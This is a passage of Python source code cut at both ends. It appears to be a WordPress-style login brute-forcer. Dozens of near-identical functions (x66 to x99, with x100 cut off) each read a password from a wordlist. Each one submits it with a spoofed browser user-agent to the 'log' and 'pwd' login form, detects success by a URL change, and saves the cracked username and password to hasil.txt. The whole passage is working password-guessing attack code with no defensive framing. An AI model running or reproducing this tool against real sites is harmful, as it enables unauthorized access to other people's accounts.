        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x66():
    w1=k66.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x67():
    w1=k67.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x68():
    w1=k68.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x69():
    w1=k69.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x70():
    w1=k70.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x71():
    w1=k71.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x72():
    w1=k72.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x73():
    w1=k73.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x74():
    w1=k74.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x75():
    w1=k75.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x76():
    w1=k76.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x77():
    w1=k77.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x78():
    w1=k78.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x79():
    w1=k79.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x80():
    w1=k80.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x81():
    w1=k81.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x82():
    w1=k82.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x83():
    w1=k83.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x84():
    w1=k84.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x85():
    w1=k85.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x86():
    w1=k86.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x87():
    w1=k87.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x88():
    w1=k88.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x89():
    w1=k89.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x90():
    w1=k90.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x91():
    w1=k91.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x92():
    w1=k92.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x93():
    w1=k93.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x94():
    w1=k94.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x95():
    w1=k95.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x96():
    w1=k96.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x97():
    w1=k97.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x98():
    w1=k98.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x99():
    w1=k99.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x100():
    w1=k100.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
